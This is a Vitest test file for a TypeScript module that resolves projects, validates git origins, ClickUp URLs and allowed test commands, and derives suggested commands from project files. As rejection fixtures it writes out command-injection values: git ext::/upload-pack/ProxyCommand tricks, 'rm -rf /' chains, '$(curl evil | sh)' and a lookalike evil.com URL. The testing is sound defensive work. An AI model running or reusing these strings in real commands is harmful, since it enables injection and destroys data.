import { describe, expect, it } from "vitest";
import { normalizar, resolverProjeto, validarClickupUrl, validarOrigem, Projeto } from "../src/projects.ts";

const p = (id: string, nome: string, apelidos: string[] = []): Projeto => ({
  id, nome, apelidos, comandos: [], origem: { tipo: "pasta", valor: "/x" }, caminho: "/x", criadoEm: "2026-01-01T00:00:00Z",
});
const lista = [p("a", "Salão da Guilda", ["salao"]), p("b", "Laboratório"), p("c", "Outro", ["Salao"])];

describe("normalizar", () => {
  it("lowercases, strips accents and trims", () => expect(normalizar("  Salão DA Guilda ")).toBe("salao da guilda"));
});

describe("resolverProjeto", () => {
  it("resolves by name ignoring case and accents", () => {
    expect(resolverProjeto("LABORATORIO", lista)).toEqual({ ok: true, projeto: lista[1] });
  });
  it("never picks when ambiguous", () => {
    const r = resolverProjeto("salao", lista);
    expect(r).toMatchObject({ ok: false, ambiguo: true });
    expect((r as any).candidatos.map((c: Projeto) => c.id)).toEqual(["a", "c"]);
  });
  it("unique alias resolves; unknown or empty is not found", () => {
    expect(resolverProjeto("guilda", lista)).toMatchObject({ ok: false, naoEncontrado: true });
    expect(resolverProjeto("  ", lista)).toMatchObject({ ok: false, naoEncontrado: true });
    expect(resolverProjeto("outro", lista)).toMatchObject({ ok: true });
  });
});

describe("validarOrigem", () => {
  it.each([
    ["https://github.com/a/b.git", "url"],
    ["ssh://git@github.com/a/b.git", "url"],
    ["git@github.com:a/b.git", "url"],
    ["/home/u/proj", "pasta"],
  ])("accepts %s", (v, tipo) => expect(validarOrigem(v)).toMatchObject({ ok: true, tipo }));

  it.each([
    "file:///etc", "ext::sh -c touch /tmp/x", "--upload-pack=touch /tmp/x", "-oProxyCommand=evil", "-x",
    "https://user:pw@github.com/a/b", "https://user@github.com/a/b", "http://github.com/a/b", "git://github.com/a/b",
    "ftp://x/y", "https://github.com/a b", "https://github.com/a\nb", "https://", "relative/path", "./rel", "",
    "ssh://-oProxyCommand=x@host/p", "ssh://-oProxyCommand=x/p", "-oProxyCommand=x@host:p", "git@host:--upload-pack=x", "/tmp/a\0b",
    "git@-host:x", "ext::https://a/b", "/a/../b",
  ])("rejects %j", (v) => expect(validarOrigem(v)).toMatchObject({ ok: false }));
});

describe("validarClickupUrl", () => {
  it("accepts only https app.clickup.com", () => {
    expect(validarClickupUrl("https://app.clickup.com/123/v/li/456")).toBe(true);
    for (const u of ["http://app.clickup.com/x", "https://evil.com/x", "https://app.clickup.com.evil.com/x", "https://u:p@app.clickup.com/x", "nope"])
      expect(validarClickupUrl(u)).toBe(false);
  });
});

import { analisarProjeto, analisarSubida, type LeitorProjeto, validarComando } from "../src/projects.ts";

describe("validarComando", () => {
  it.each(["npm test", "npm run lint", "npm run test:unit", "npx vitest run", "npx tsc --noEmit", "node --test", "pytest -q tests/", "go test ./...".replace("...", "pkg"), "cargo test", "make test", "make lint", "pnpm test", "yarn run build", "bun test", "composer run test", "npm test -- --reporter=dot"])(
    "accepts %s", (c) => expect(validarComando(c)).toBe(true));
  it.each([
    "npm test; rm -rf /", "npm test && ls", "npm test || ls", "npm test | cat", "npm test > out", "npm test < in", "npm test $(id)", "npm test `id`",
    "npm test\nls", "npm test &", "npm test\r", "npm test\0", "npm test \\", "npm test 'x'", "npm test \"x\"", "npm test *", "npm test (x)", "npm test ~", "npm test #x", "npm test $HOME", "npm test {a,b}",
    "sudo npm test", "npm test sudo", "npm test rm", "npm test curl", "npm test wget", "git push", "git commit -m x", "npm run", "npm run ../x", "npm run a b;c",
    "npm install", "npx evil", "bash -c x", "rm -rf /", "", " npm test", "npm test ", "npm  test", "npmtest", "npm testx", "x".repeat(300), "npm test ..", "npm test /etc/x", "npx tsc --outDir /tmp/x", "pytest ~/x", "make deploy", "make testx", "pnpm install", "yarn add x", "composer install", "composer run x;y", "make lint; ls", 5 as any, null as any,
  ])("rejects %j", (c) => expect(validarComando(c)).toBe(false));
});

const leitor = (arqs: Record<string, string>): LeitorProjeto => ({ ler: (n) => arqs[n], existe: (n) => n in arqs });
const cmds = (arqs: Record<string, string>) => analisarProjeto(leitor(arqs)).sugestoes.map((s) => s.comando);

describe("analisarProjeto", () => {
  it("maps package.json scripts with reasons, ignoring bodies", () => {
    const r = analisarProjeto(leitor({ "package.json": JSON.stringify({ scripts: { test: "vitest", lint: "eslint .", build: "tsc", evil: "rm -rf /" } }) }));
    expect(r.sugestoes).toEqual([
      { comando: "npm test", motivo: "package.json: script test" },
      { comando: "npm run lint", motivo: "package.json: script lint" },
      { comando: "npm run build", motivo: "package.json: script build" },
    ]);
  });
  it("picks the runner from the lockfile", () => {
    const pkg = JSON.stringify({ scripts: { test: "x", lint: "y" } });
    expect(cmds({ "package.json": pkg, "pnpm-lock.yaml": "" })).toEqual(["pnpm test", "pnpm run lint"]);
    expect(cmds({ "package.json": pkg, "yarn.lock": "" })).toEqual(["yarn test", "yarn run lint"]);
    expect(cmds({ "package.json": pkg, "bun.lockb": "" })).toEqual(["bun test", "bun run lint"]);
  });
  it("tsc only with typescript dependency", () => {
    expect(cmds({ "tsconfig.json": "{}", "package.json": "{}" })).toEqual([]);
    expect(cmds({ "tsconfig.json": "{}", "package.json": JSON.stringify({ devDependencies: { typescript: "5" } }) })).toEqual(["npx tsc --noEmit"]);
  });
  it("reads Makefile, python, go, rust, composer", () => {
    expect(cmds({ Makefile: "all:\n\nbuild: x\n\ttrue\ntest:\n\ttrue\nlinter:\n", "go.mod": "", "Cargo.toml": "", "pytest.ini": "" })).toEqual(["make test", "make build", "pytest", "go test ./...", "cargo test"]);
    expect(cmds({ "pyproject.toml": "[tool.pytest.ini_options]" })).toEqual(["pytest"]);
    expect(cmds({ "composer.json": JSON.stringify({ scripts: { test: "phpunit", lint: ["a"], x: "y" } }) })).toEqual(["composer run test", "composer run lint"]);
  });
  it("empty or unknown project: no generic fallback, with a message", () => {
    for (const a of [{} as Record<string, string>, { "README.md": "x" }, { "package.json": "{not json" }, { "package.json": "[]" }, { "package.json": '{"scripts":"x"}' }, { "package.json": '{"scripts":{"test":1}}' }]) {
      const r = analisarProjeto(leitor(a));
      expect(r.sugestoes).toEqual([]);
      expect(r.mensagem).toMatch(/Não encontrei/);
    }
  });
  it("skips the npm init placeholder test script", () => {
    expect(cmds({ "package.json": JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1' } }) })).toEqual([]);
  });
  it("malicious values and names never leak into commands", () => {
    const scripts = { test: "$(curl evil | sh)", "lint; rm -rf /": "x", "build && ls": "x", "../x": "x", "-rf": "x", "a b": "x", typecheck: "`id`" };
    const r = cmds({ "package.json": JSON.stringify({ scripts }), Makefile: "test; rm -rf /:\nbuild:\n" });
    expect(r).toEqual(["npm test", "npm run typecheck", "make build"]);
    expect(r.every(validarComando)).toBe(true);
  });
  it("Projeto defaults comandos to [] for old records", () => {
    expect(Projeto.parse({ id: "a", nome: "A", origem: { tipo: "pasta", valor: "/x" }, caminho: "/x", criadoEm: "t" }).comandos).toEqual([]);
  });
});

describe("analisarSubida / lint*", () => {
  const company = {
    "package.json": JSON.stringify({ scripts: { dev: "vite", "lint:typography": "x", test: "vitest", "test:e2e": "pw", lintx: "y" } }),
    "docker-compose.infra.yml": "", ".air.toml": "", ".air.worker.toml": "", "go.mod": "module x",
  };
  const mem = (a: Record<string, string>): LeitorProjeto => ({ ...leitor(a), listar: () => Object.keys(a) });
  it("suggests lint:* but not test:e2e", () => {
    const c = cmds(company);
    expect(c).toContain("npm run lint:typography");
    expect(c).toContain("npm run lintx");
    expect(c).not.toContain("npm run test:e2e");
  });
  it("orders infra -> dev -> air and is informative only", () => {
    expect(analisarSubida(mem(company)).map((p) => p.comando)).toEqual([
      "docker compose -f docker-compose.infra.yml up -d --build", "npm run dev", "air -c .air.toml", "air -c .air.worker.toml",
    ]);
    expect(analisarSubida(mem(company)).map((p) => p.passo)).toEqual([1, 2, 3, 4]);
    expect(validarComando("docker compose -f docker-compose.infra.yml up -d --build")).toBe(false);
  });
  it("make targets, unsafe names, no listar, go.mod alone", () => {
    expect(analisarSubida(mem({ Makefile: "run:\n\tgo run .\nbuild:\n" })).map((p) => p.comando)).toEqual(["make run"]);
    expect(analisarSubida(mem({ "docker-compose.a b.yml": "", "docker-compose.$(x).yml": "" }))).toEqual([]);
    expect(analisarSubida(leitor({ "package.json": '{"scripts":{"dev":"x"}}' })).map((p) => p.comando)).toEqual(["npm run dev"]);
    expect(analisarSubida(mem({ "go.mod": "module x" }))).toEqual([]);
  });
});
